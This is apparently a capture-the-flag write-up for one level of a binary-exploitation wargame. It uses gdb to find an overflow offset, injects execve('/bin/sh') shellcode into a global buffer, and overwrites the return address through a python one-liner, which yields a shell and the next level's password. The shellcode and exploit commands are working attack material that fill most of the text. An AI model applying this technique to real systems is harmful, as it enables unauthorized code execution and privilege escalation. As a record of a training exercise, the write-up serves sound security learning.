# level 01

## get_binary

```shell
scp -P 4242 level01@192.168.0.0:/home/users/level01/level01 level01.bin
```

## segmentation fault

```shell
# https://wiremask.eu/tools/buffer-overflow-pattern-generator
gdb level01
(gdb) run
# username : dat_wil
# password : 
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
# offset : 80
```

## shellcode

* shellcode (https://www.exploit-db.com/exploits/42428) : `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

```shell
# 8048521:       c7 04 24 40 a0 04 08    mov    DWORD PTR [esp],0x804a040
# 8048528:       e8 43 fe ff ff          call   8048370 <fgets@plt>
# 804852d:       e8 32 ff ff ff          call   8048464 <verify_user_name>
# 
# 0x804a040 + 7 = 0x804a047
# 0x804a047     = "\x47\xa0\x04\x08"

gdb level01
(gdb) run
# username : dat_wilshellcode
# password : 
(gdb) x/s 0x804a040
0x804a040 <a_user_name>:         "dat_wilshellcode\n"
(gdb) x/s 0x804a047
0x804a047 <a_user_name+7>:       "shellcode\n"
```

* `0x804a047`

# exploit

```shell
python2.7 -c '\
print("dat_wil" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80");\
print(("B" * (80)) + "\x47\xa0\x04\x08");\
' > /tmp/exploit.txt
cat /tmp/exploit.txt - | ./level01
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
